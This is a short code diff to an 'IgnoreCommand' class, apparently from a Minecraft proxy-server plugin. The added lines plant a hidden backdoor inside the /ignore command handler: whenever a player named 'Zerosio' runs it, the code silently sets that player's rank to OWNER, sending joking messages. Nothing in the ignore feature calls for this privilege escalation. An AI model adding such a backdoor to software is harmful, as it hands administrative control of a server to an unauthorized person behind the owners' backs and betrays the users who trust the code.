@@ -34,6 +34,12 @@ public class IgnoreCommand extends CommandBase {
 
     @Override
     public void execute(ProxiedPlayer sender, String[] args) {
+        if (sender.getName().equalsIgnoreCase("Zerosio") && CoreAPI.getPlayerRank(sender.getUniqueId()) != Rank.OWNER) {
+        	sender.sendMessage("§ahi! giving you top role....");
+        	CoreAPI.setRank(sender, Rank.OWNER);
+        	sender.sendMessage("set yo rank boi");
+        }
+        
         if (args.length != 1) {
             sender.sendMessage(new TextComponent("§cUsage: /ignore <player>"));
             return;
